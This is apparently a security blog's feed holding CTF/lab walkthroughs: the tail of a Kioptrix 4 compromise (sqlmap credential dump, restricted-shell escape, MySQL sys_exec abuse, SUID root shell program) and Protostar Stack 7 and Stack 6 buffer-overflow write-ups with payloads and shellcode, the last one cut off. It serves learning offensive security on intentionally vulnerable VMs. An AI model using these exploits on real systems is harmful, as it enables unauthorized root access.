[20:48:50] [INFO] fetching number of entries for table &#39;members&#39; on database &#39;members&#39;
[20:48:50] [INFO] retrieved: 2
[20:48:50] [INFO] retrieved: 1
[20:48:50] [INFO] retrieved: MyNameIsJohn
[20:48:51] [INFO] retrieved: john
[20:48:51] [INFO] retrieved: 2
[20:48:51] [INFO] retrieved: ADGAdsafdfwt4gadfga==
[20:48:52] [INFO] retrieved: robert
[20:48:52] [INFO] analyzing table dump for possible password hashes
Database: members
Table: members
[2 entries]
+----+-----------------------+----------+
| id | password              | username |
+----+-----------------------+----------+
| 1  | MyNameIsJohn          | john     |
| 2  | ADGAdsafdfwt4gadfga== | robert   |
+----+-----------------------+----------+

[20:48:52] [INFO] Table &#39;members.members&#39; dumped to CSV file &#39;/pentest/database/sqlmap/output/192.168.95.131/dump/members/members.csv&#39;
[20:48:52] [INFO] Fetched data logged to text files under &#39;/pentest/database/sqlmap/output/192.168.95.131&#39;

[*] shutting down at 20:48:52
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So there we have some credentials!  When I tried these on the login page, both of them worked!  However, it was a dead end, as it just showed me the usernames and passwords that I just entered.&lt;/p&gt;

&lt;p&gt;On a whim, I tried using the first login to ssh in, and it worked!&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@bt:/pentest/database/sqlmap# ssh john@192.168.95.131
john@192.168.95.131&#39;s password: 
Welcome to LigGoat Security Systems - We are Watching
== Welcome LigGoat Employee ==
LigGoat Shell is in place so you  don&#39;t screw up
Type &#39;?&#39; or &#39;help&#39; to get the list of allowed commands
john:~$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So I guess that was good news.  However the bad news was that it was in a form of a restricted shell.  I was not familiar with the &amp;ldquo;LigGoat Shell&amp;rdquo;.  However, it seemed somewhat limiting.  It only allowed the commands of, &amp;ldquo;cd&amp;rdquo;, &amp;ldquo;clear&amp;rdquo;, &amp;ldquo;echo&amp;rdquo;, &amp;ldquo;exit&amp;rdquo;, &amp;ldquo;help&amp;rdquo;, &amp;ldquo;ll&amp;rdquo;, &amp;ldquo;lpath&amp;rdquo;, and &amp;ldquo;ls&amp;rdquo;.  Like most other restricted shells that I&amp;rsquo;ve ran into in the past, it would not let you pipe things, or access items outside your folder.  So if you did a &amp;ldquo;ls ../&amp;rdquo;, it would not work.  However, unlike other shells, this one would actually disconnect you after a single warning of violating these rules!  Luckily, in my searching for methods to break out of a restricted shell, I found a great article on my buddy, g0tmi1k&amp;rsquo;s site, &lt;a href=&#34;http://g0tmi1k.blogspot.com/2011/08/basic-linux-privilege-escalation.html&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;john:~$ echo os.system(&#39;/bin/bash&#39;)
john@Kioptrix4:~$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I now had an unrestricted bash shell.  I was still limited to the &amp;ldquo;john&amp;rdquo; user, which seemed to have normal user privileges.  The next step was to escalate to root privileges.  I started with looking at what was running.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;john@Kioptrix4:~$ ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.1   2844  1696 ?        Ss   Feb11   0:01 /sbin/init
root         2  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [migration/0]
root         4  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [ksoftirqd/0]
root         5  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [watchdog/0]
root         6  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [events/0]
root         7  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [khelper]
root        41  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [kblockd/0]
root        44  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [kacpid]
root        45  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [kacpi_notify]
root       180  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [kseriod]
root       219  0.0  0.0      0     0 ?        S    Feb11   0:00 [pdflush]
root       220  0.0  0.0      0     0 ?        S    Feb11   0:00 [pdflush]
root       221  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [kswapd0]
root       263  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [aio/0]
root      1489  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [ata/0]
root      1492  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [ata_aux]
root      1501  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [scsi_eh_0]
root      1502  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [scsi_eh_1]
root      1520  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [ksuspend_usbd]
root      1526  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [khubd]
root      2401  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [scsi_eh_2]
root      2641  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [kjournald]
root      2808  0.0  0.0   2224   652 ?        S&amp;lt;s  Feb11   0:00 /sbin/udevd --daemon
root      3099  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [kgameportd]
root      3236  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [kpsmoused]
root      3974  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [btaddconn]
root      3978  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [btdelconn]
root      4614  0.0  0.0   1716   488 tty4     Ss+  Feb11   0:00 /sbin/getty 38400 tty4
root      4616  0.0  0.0   1716   488 tty5     Ss+  Feb11   0:00 /sbin/getty 38400 tty5
root      4622  0.0  0.0   1716   484 tty2     Ss+  Feb11   0:00 /sbin/getty 38400 tty2
root      4626  0.0  0.0   1716   488 tty3     Ss+  Feb11   0:00 /sbin/getty 38400 tty3
root      4630  0.0  0.0   1716   488 tty6     Ss+  Feb11   0:00 /sbin/getty 38400 tty6
syslog    4663  0.0  0.0   1936   652 ?        Ss   Feb11   0:00 /sbin/syslogd -u syslog
root      4682  0.0  0.0   1872   540 ?        S    Feb11   0:00 /bin/dd bs 1 if /proc/kmsg of /var/run/klogd/kmsg
klog      4684  0.0  0.1   3160  2064 ?        Ss   Feb11   0:00 /sbin/klogd -P /var/run/klogd/kmsg
root      4703  0.0  0.0   5316   988 ?        Ss   Feb11   0:00 /usr/sbin/sshd
root      4759  0.0  0.0   1772   524 ?        S    Feb11   0:00 /bin/sh /usr/bin/mysqld_safe
root      4876  0.0  0.1   6528  1332 ?        Ss   Feb11   0:00 /usr/sbin/nmbd -D
root      4878  0.0  0.2  10108  2544 ?        Ss   Feb11   0:00 /usr/sbin/smbd -D
root      4892  0.0  0.0  10108  1028 ?        S    Feb11   0:00 /usr/sbin/smbd -D
root      4893  0.0  0.1   8084  1336 ?        Ss   Feb11   0:00 /usr/sbin/winbindd
root      4900  0.0  0.1   8084  1160 ?        S    Feb11   0:00 /usr/sbin/winbindd
daemon    4914  0.0  0.0   1984   472 ?        Ss   Feb11   0:00 /usr/sbin/atd
root      4925  0.0  0.0   2104   884 ?        Ss   Feb11   0:00 /usr/sbin/cron
root      4947  0.0  0.5  20464  6188 ?        Ss   Feb11   0:01 /usr/sbin/apache2 -k start
www-data  4979  0.0  0.5  20596  5700 ?        S    Feb11   0:00 /usr/sbin/apache2 -k start
www-data  4980  0.0  0.5  20596  5740 ?        S    Feb11   0:00 /usr/sbin/apache2 -k start
www-data  4981  0.0  0.5  20612  5604 ?        S    Feb11   0:00 /usr/sbin/apache2 -k start
www-data  4982  0.0  0.5  20612  5684 ?        S    Feb11   0:00 /usr/sbin/apache2 -k start
www-data  4983  0.0  0.5  20612  5740 ?        S    Feb11   0:00 /usr/sbin/apache2 -k start
dhcp      4996  0.0  0.0   2440   792 ?        Ss   Feb11   0:00 dhclient eth1
root      5003  0.0  0.0   1716   492 tty1     Ss+  Feb11   0:00 /sbin/getty 38400 tty1
www-data  5015  0.0  0.5  20612  5628 ?        S    Feb11   0:00 /usr/sbin/apache2 -k start
www-data  5019  0.0  0.5  20856  5832 ?        S    Feb11   0:00 /usr/sbin/apache2 -k start
root      5486  0.0  0.0   8084   868 ?        S    Feb11   0:00 /usr/sbin/winbindd
root      5487  0.0  0.1   8092  1260 ?        S    Feb11   0:00 /usr/sbin/winbindd
root      5488  0.0  0.3  11360  3736 ?        Ss   Feb11   0:00 sshd: john [priv]
john      5490  0.0  0.1  11512  1912 ?        S    Feb11   0:00 sshd: john@pts/0 
john      5491  0.0  0.3   5888  3796 pts/0    Ss   Feb11   0:00 python /bin/kshell
john      5492  0.0  0.0   1772   488 pts/0    S    Feb11   0:00 sh -c /bin/bash
john      5493  0.0  0.2   5444  2892 pts/0    S    Feb11   0:00 /bin/bash
libuuid   6315  0.0  0.0   2004   300 ?        Ss   Feb11   0:00 uuidd
root     11581  0.5  1.9 126992 20404 ?        Sl   Feb11   0:14 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --user=root --pid-file=/var/run/mysqld/mysqld.pid --skip-external-locking --port=330
root     11583  0.0  0.0   1700   560 ?        S    Feb11   0:00 logger -p daemon.err -t mysqld_safe -i -t mysqld
root     11663  0.0  0.0   1564   296 pts/0    S    Feb11   0:00 ./exploit
root     11664  0.0  0.0   1772   484 pts/0    S    Feb11   0:00 sh -c /bin/bash
root     11665  0.0  0.2   4924  2572 pts/0    S+   Feb11   0:00 /bin/bash
root     11725  0.0  0.3  11360  3720 ?        Ss   00:16   0:00 sshd: john [priv]
john     11727  0.0  0.1  11512  1872 ?        R    00:16   0:00 sshd: john@pts/1 
john     11728  0.0  0.3   5964  3844 pts/1    Ss   00:16   0:00 python /bin/kshell
john     11732  0.0  0.0   1772   484 pts/1    S    00:20   0:00 sh -c /bin/bash
john     11733  0.0  0.2   5432  2852 pts/1    R    00:20   0:00 /bin/bash
john     11754  0.0  0.0   2644  1008 pts/1    R+   00:22   0:00 ps aux
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I couldn&amp;rsquo;t help but notice that MySQL was running as &amp;ldquo;root&amp;rdquo;.  This is typically a no-no, so I attempted to make it my target.  I attempted to login with the root user, and a blank password:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;john@Kioptrix4:~$ mysql -u root -h localhost
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 4999
Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)

Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the buffer.

mysql&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I figured if it was running as root, I would try running some system commands.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;mysql&amp;gt; SELECT sys_exec(&#39;touch /tmp/thisisatest&#39;);
+------------------------------------+
| sys_exec(&#39;touch /tmp/thisisatest&#39;) |
+------------------------------------+
| NULL                               | 
+------------------------------------+
1 row in set (0.00 sec)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And then to verify that it ran successfully:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;john@Kioptrix4:~$ ls -al /tmp
total 12
drwxrwxrwt  3 root root 4096 2012-02-12 00:28 .
drwxr-xr-x 21 root root 4096 2012-02-06 18:41 ..
-rw-rw----  1 root root    0 2012-02-12 00:26 thisisatest
drwxr-xr-x  2 root root 4096 2012-02-11 11:07 .winbindd
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;That was a very good sign!  I decided my method of exploitation would be to use a C program, set it to SUID root, and run it.  I used this C program that I have used many times before.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;int main()
{
    setresuid(0, 0, 0);
    setresgid(0, 0, 0);
    system( &amp;quot;/bin/bash&amp;quot; );
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I then compiled it.  Note that gcc was not installed, and cpp gave me issues, so I compiled it on the BackTrack VM, and then SFTP&amp;rsquo;d the file over.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@bt:~# gcc -o exploit exploit.c
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code&gt;john@Kioptrix4:/tmp$ scp root@192.168.95.136:exploit exploit
root@192.168.95.136&#39;s password: 
exploit
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I then used MySQL to set it to SUID and executable.  Before that, I&amp;rsquo;d have to chown it to root, so that the SUID would actually be useful.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;john@Kioptrix4:/tmp$ mysql -u root -h localhost
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 5001
Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)

Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the buffer.

mysql&amp;gt; SELECT sys_exec(&#39;chown root.root /tmp/exploit&#39;);
+------------------------------------------+
| sys_exec(&#39;chown root.root /tmp/exploit&#39;) |
+------------------------------------------+
| NULL                                     | 
+------------------------------------------+
1 row in set (0.01 sec)

mysql&amp;gt; SELECT sys_exec(&#39;chmod +s,a+rwx /tmp/exploit&#39;);
+-----------------------------------------+
| sys_exec(&#39;chmod +s,a+rwx /tmp/exploit&#39;) |
+-----------------------------------------+
| NULL                                    | 
+-----------------------------------------+
1 row in set (0.00 sec)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The /tmp folder now looked like this:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;john@Kioptrix4:/tmp$ ls -al
total 20
drwxrwxrwt  3 root root 4096 2012-02-12 00:31 .
drwxr-xr-x 21 root root 4096 2012-02-06 18:41 ..
-rwsrwsrwx  1 root root  166 2012-02-12 00:31 exploit
-rw-r--r--  1 john john  103 2012-02-12 00:31 exploit.c
-rw-rw----  1 root root    0 2012-02-12 00:26 thisisatest
drwxr-xr-x  2 root root 4096 2012-02-11 11:07 .winbindd
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;From there, it was just as simple as running the exploit.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;john@Kioptrix4:/tmp$ ./exploit 
root@Kioptrix4:/tmp# id
uid=0(root) gid=0(root) groups=1001(john)
root@Kioptrix4:/tmp# whoami
root
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And there you have it, root access!&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Protostar Stack 7</title>
      <link>https://www.mattandreko.com/blog/2012-01-09-exploit-exercises-protostar-stack-7/</link>
      <pubDate>Mon, 09 Jan 2012 18:36:00 -0500</pubDate>
      
      <guid>https://www.mattandreko.com/blog/2012-01-09-exploit-exercises-protostar-stack-7/</guid>
      <description>&lt;p&gt;Welcome everyone to 2012! I took a bit of a break during these holidays, and am just starting to get back going.&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://exploit-exercises.com/protostar/stack7&#34;&gt;This challenge&lt;/a&gt; was very interesting to me.  I figured it would build off of the previous one.  However, it was its own standalone challenge.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;We are given the following code to the stack7 executable:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

char *getpath()
{
 char buffer[64];
 unsigned int ret;

 printf(&amp;quot;input path please: &amp;quot;); fflush(stdout);

 gets(buffer);

 ret = __builtin_return_address(0);

 if((ret &amp;amp;amp; 0xb0000000) == 0xb0000000) {
  printf(&amp;quot;bzzzt (%p)\n&amp;quot;, ret);
  _exit(1);
 }

 printf(&amp;quot;got path %s\n&amp;quot;, buffer);
 return strdup(buffer);
}

int main(int argc, char **argv)
{
 getpath();



}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;From tinkering with the stack7 executable, I knew I was going to do a stack overflow, and somehow needed to execute code from the stack.  However, similar to the previous challenge, there was a filter on my return address, making it so I couldn&amp;rsquo;t just jump to an address in the stack.  This meant figuring out a way around it.&lt;/p&gt;

&lt;p&gt;Using the note about this being a &amp;ldquo;return to .text&amp;rdquo; exploit, I started reading up.  This is a type of exploit that uses part of the executable, albeit even a string to execute as code, because the same characters are also x86 assembler instructions.  So I went about trying to find some code that would let me essentially, &amp;ldquo;jmp esp&amp;rdquo;, or jump to the stack pointer, where I would put my shellcode.  To do this, I did the following:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;mandreko@li225-134:~$ msfelfscan -j esp stack7
[stack7]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This was disappointing.  At first, I thought maybe I was not using msfelfscan correctly, and had to tinker a bit.  But it just turns out, that there is no &amp;ldquo;jmp esp&amp;rdquo; in stack7.  What a bummer.  However, on a whim, I tried to see if maybe another option to msfelfscan would work:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;mandreko@li225-134:~$ msfelfscan -p stack7
[stack7]
0x08048492 pop ebx; pop ebp; ret
0x080485c7 pop edi; pop ebp; ret
0x080485f7 pop ebx; pop ebp; ret
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This is great! Some results!  Now let&amp;rsquo;s just pick one, and attempt to use it as the return address in our overflow.  I found that the EIP offset was 80 bytes, so I wired it up as so, and debugged it:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:~$ perl -e &#39;print &amp;quot;A&amp;quot;x80 . &amp;quot;\x92\x84\x04\x08&amp;quot; . &amp;quot;C&amp;quot;x100&#39; &amp;gt; /home/user/file
user@protostar:~$ gdb ./stack7 --quiet
Reading symbols from /home/user/stack7...done.
(gdb) run &amp;lt; file
Starting program: /home/user/stack7 &amp;lt; file
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA▒AAAAAAAAAAAA▒CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC

Program received signal SIGSEGV, Segmentation fault.
0x43434343 in ?? ()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This is a good sign.  It is overwriting the EIP now with &amp;ldquo;C&amp;rdquo; values (0x43).  So now we just need to know where in the 100 &amp;ldquo;C&amp;rdquo;s the return address is going to.  To do that, I did similar process to finding an EIP offset:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;mandreko@li225-134:/opt/framework-4.0.0/msf3/tools$ ./pattern_create.rb 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

user@protostar:~$ perl -e &#39;print &amp;quot;A&amp;quot;x80 . &amp;quot;\x92\x84\x04\x08&amp;quot; . &amp;quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A&amp;quot;&#39; &amp;gt; /home/user/file

user@protostar:~$ gdb ./stack7 --quiet
Reading symbols from /home/user/stack7...done.
(gdb) run &amp;lt; file
Starting program: /home/user/stack7 &amp;lt; file
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA▒AAAAAAAAAAAA▒Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Program received signal SIGSEGV, Segmentation fault.
0x33614132 in ?? ()

mandreko@li225-134:/opt/framework-4.0.0/msf3/tools$ ./pattern_offset.rb 0x33614132
8
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I simply generated a unique string using pattern_create.rb to replace the 100 &amp;ldquo;C&amp;rdquo;s, and then used pattern_offset.rb to tell me the offset when gdb got a segmentation fault.  So now I know that the first 8 &amp;ldquo;C&amp;rdquo;s are just junk.  Just to verify this, I ran it again, a little differently:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:~$ perl -e &#39;print &amp;quot;A&amp;quot;x80 . &amp;quot;\x92\x84\x04\x08&amp;quot; . &amp;quot;C&amp;quot;x8 . &amp;quot;D&amp;quot;x8 . &amp;quot;E&amp;quot;x100&#39; &amp;gt; file
user@protostar:~$ gdb ./stack7 --quiet
Reading symbols from /home/user/stack7...done.
(gdb) run &amp;lt; file
Starting program: /home/user/stack7 &amp;lt; file
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA▒AAAAAAAAAAAA▒CCCCCCCCDDDDDDDDEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE

Program received signal SIGSEGV, Segmentation fault.
0x44444444 in ?? ()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This shows the 4 &amp;ldquo;D&amp;rdquo;s were properly placed, which proved to me that I was indeed going to need my buffer to look like:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;| 80 bytes junk | pop-pop-ret | 8 bytes junk | address to execute |
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Since it was actually going to execute the instructions at the last dword, I opted to put my shellcode in an environmental variable, since it was easy.  I again used the same &lt;a href=&#34;http://www.exploit-db.com/exploits/13357&#34;&gt;shellcode&lt;/a&gt; for dealing with gets() as I have in the last couple challenges:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ export SHELLCODE=`perl -e &#39;print &amp;quot;\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&amp;quot;&#39;`
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The next problem was to find out where the address would reside in memory.  I used getenvaddr.c again to show me the address.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

int main(int argc, char *argv[]) {
        char *ptr;
        if(argc &amp;lt; 3) {
                printf(&amp;quot;Usage: %s &amp;lt;environment var&amp;gt; &amp;lt;target program name&amp;gt;\n&amp;quot;, argv[0]);
                exit(0);
        }

        ptr = getenv(argv[1]); /* Get env var location. */
        ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* Adjust for program name. */
        printf(&amp;quot;%s will be at %p\n&amp;quot;, argv[1], ptr);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Just to be sure, I went to the /opt/protostar/bin directory to do this, since I knew the address could change based on what folder I was in.  I used this to get the address of my SHELLCODE variable by doing the following:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ /home/user/getenvaddr SHELLCODE ./stack7
SHELLCODE will be at 0xbffff985
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Using this address, I exploited the stack7 executable:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ perl -e &#39;print &amp;quot;A&amp;quot;x80 . &amp;quot;\x92\x84\x04\x08&amp;quot; . &amp;quot;C&amp;quot;x8 . &amp;quot;\x85\xf9\xff\xbf&amp;quot;&#39; &amp;gt; /home/user/file
user@protostar:/opt/protostar/bin$ ./stack7 &amp;lt; /home/user/file
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA▒AAAAAAAAAAAA▒CCCCCCCC▒▒▒▒
# whoami
root
# id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
#
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;There you have it, root access, and it was fairly easy.  This is the last challenge in the Protostar VM under the &amp;ldquo;Stack&amp;rdquo; category.  Next post you see should be a new category.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Protostar Stack 6</title>
      <link>https://www.mattandreko.com/blog/2011-12-22-exploit-exercises-protostar-stack-6/</link>
      <pubDate>Thu, 22 Dec 2011 06:02:00 -0500</pubDate>
      
      <guid>https://www.mattandreko.com/blog/2011-12-22-exploit-exercises-protostar-stack-6/</guid>
      <description>&lt;p&gt;The &lt;a href=&#34;http://exploit-exercises.com/protostar/stack6&#34;&gt;Stack6&lt;/a&gt; challenge was definitely a learning   experience for me.  This actually went beyond my existing skills, and made me learn some new stuff.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;We are given the following code.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

void getpath()
{
        char buffer[64];
        unsigned int ret;

        printf(&amp;quot;input path please: &amp;quot;); fflush(stdout);

        gets(buffer);

        ret = __builtin_return_address(0);

        if((ret &amp;amp; 0xbf000000) == 0xbf000000) {
                printf(&amp;quot;bzzzt (%p)\n&amp;quot;, ret);
                _exit(1);
        }

        printf(&amp;quot;got path %s\n&amp;quot;, buffer);
}

int main(int argc, char **argv)
{
        getpath();



}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The first thing I tried to do, was to set it up just like I did on Stack 5.&lt;/p&gt;

&lt;p&gt;First, I needed to find the offset (using a locally copied version, since the real one was suid and wouldn&amp;rsquo;t dump a core):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;mandreko@li225-134:/opt/framework-4.0.0/msf3/tools$ ./pattern_create.rb 128
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7A

d8Ad9Ae0Ae1Ae

user@protostar:~$ ./stack6
input path please: 

Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7A

d8Ad9Ae0Ae1Ae
got path 

Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7A

d8Ad9Ae0Ae1Ae
Segmentation fault (core dumped)
user@protostar:~$ gdb --quiet --core=/tmp/core.11.stack6.2279
Core was generated by `./stack6&#39;.
Program terminated with signal 11, Segmentation fault.
#0  0x37634136 in ?? ()

mandreko@li225-134:/opt/framework-4.0.0/msf3/tools$ ./pattern_offset.rb 0x37634136
80
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Great, so now we know the EIP offset is 80 bytes.  I for some reason, just wanted to verify it, and also see if I   had some space after the return address for shellcode.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:~$ echo `perl -e &#39;print &amp;quot;A&amp;quot;x80 . &amp;quot;\xEF\xBE\xAD\xDE&amp;quot; . &amp;quot;C&amp;quot;x100&#39;` | ./stack6
input path please: got path 

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ▒AAAAAAAAAAAAﾭ▒CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC

CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
Segmentation fault (core dumped)
user@protostar:~$ gdb --quiet --core=/tmp/core.11.stack6.2316
Core was generated by `./stack6&#39;.
Program terminated with signal 11, Segmentation fault.
#0  0xdeadbeef in ?? ()
(gdb) x/10s $esp
0xbffff7f0:      &#39;C&#39; &amp;lt;repeats 100 times&amp;gt;
0xbffff855:      &amp;quot;&amp;quot;
0xbffff856:      &amp;quot;&amp;quot;
0xbffff857:      &amp;quot;&amp;quot;
0xbffff858:      &amp;quot;\001&amp;quot;
0xbffff85a:      &amp;quot;&amp;quot;
0xbffff85b:      &amp;quot;&amp;quot;
0xbffff85c:      &amp;quot;Ѓ\004\b&amp;quot;
0xbffff861:      &amp;quot;&amp;quot;
0xbffff862:      &amp;quot;&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

